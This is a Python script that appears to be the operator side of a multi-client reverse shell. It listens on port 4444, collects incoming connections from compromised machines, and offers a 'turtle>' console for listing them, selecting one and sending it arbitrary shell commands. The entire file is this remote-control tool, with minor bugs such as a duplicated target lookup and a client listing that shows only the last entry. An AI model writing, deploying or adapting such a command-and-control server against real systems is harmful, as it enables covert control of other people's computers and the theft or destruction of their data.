import socket
import sys
import time
import threading
from queue import Queue

JOB_NUMBER = [1, 2]
NO_OF_THREADS = 2
queue  = Queue()
all_connections = []
all_address = []

def create_socket():
    try:
        global host
        global port
        global s

        host = ''
        port = 4444
        s = socket.socket()
    except socket.error as msg:
        print(str(msg))

def bind_connection():
    try:
        global host
        global port
        global s

        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print(str(msg) + "Retrying connection.......")
        bind_connection()

def accept_connection():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, add = s.accept()
            s.setblocking(1)
            all_connections.append(conn)
            all_address.append(add)

            print("connection Established:" + add[0])
        except:
            print("Error in Establishing connection")

# creating second thread

def turtle():

    while True:
        cmd = input('turtle> ')

        if cmd == 'list':
            list_connection()

        elif 'select' in cmd:
            get_target(cmd)
            conn = get_target(cmd)

            if conn is not None:
                send_target_command(conn)

# display all the active connection from the client

def list_connection():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)

        conn = all_connections[target]
        print("you are not connected to:" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end = "")

        return conn
    except:
        print("selection not valid")
        return None

def send_target_command(conn):

    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                responce = conn.recv(20480)
                responce = str(responce, "utf-8")
                print(responce)
        except:
            print("Error in sending commands.....")
            break
# creating threading and asighning jobs to queue....

def create_worker():

    for _ in range(NO_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():

    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_connection()
            accept_connection()

        if x == 2:
            turtle()

        queue.task_done()

def create_job():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_worker()
create_job()
